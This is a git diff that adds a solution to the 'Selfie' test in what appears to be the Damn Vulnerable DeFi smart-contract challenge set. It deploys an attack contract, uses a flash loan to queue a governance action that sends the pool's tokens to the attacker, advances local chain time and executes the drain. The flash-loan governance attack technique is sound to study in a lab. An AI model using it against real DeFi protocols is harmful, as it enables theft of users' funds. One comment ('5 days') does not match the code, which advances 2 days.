@@ -30,7 +30,40 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+
+        // Deploy the HackSelfiePool contract
+        console.log('Deploying HackSelfiePool contract...');
+        const HackSelfiePool = await ethers.getContractFactory('HackSelfiePool', deployer);
+        let hack = await HackSelfiePool.deploy(
+            this.pool.address,
+            this.token.address,
+            this.governance.address,
+            attacker.address
+        );
+        await hack.deployed();
+
+        // Check DVT balance
+        console.log(`SelfiePool DVT Balance: ${await this.token.balanceOf(this.pool.address)}`);
+        console.log(`SimpleGovernance DVT Balance: ${await this.token.balanceOf(this.governance.address)}`);
+        console.log(`Attacker DVT Balance: ${await this.token.balanceOf(attacker.address)}`);
+
+        // Take a flashloan that proposes an action that would transfer all DVT to attacker (queueAction)
+        console.log('Hacking...');
+        await hack.hack();
+        console.log('Done hacking...');
+
+        // Increment a block
+        console.log('Advance 2 days...');
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+        await ethers.provider.send("evm_mine");  // Mine a block
+
+        // Execute the action (executeAction)
+        await this.governance.executeAction(1);
+
+        // Check DVT balance
+        console.log(`SelfiePool DVT Balance: ${await this.token.balanceOf(this.pool.address)}`);
+        console.log(`SimpleGovernance DVT Balance: ${await this.token.balanceOf(this.governance.address)}`);
+        console.log(`Attacker DVT Balance: ${await this.token.balanceOf(attacker.address)}`);
     });
 
     after(async function () {
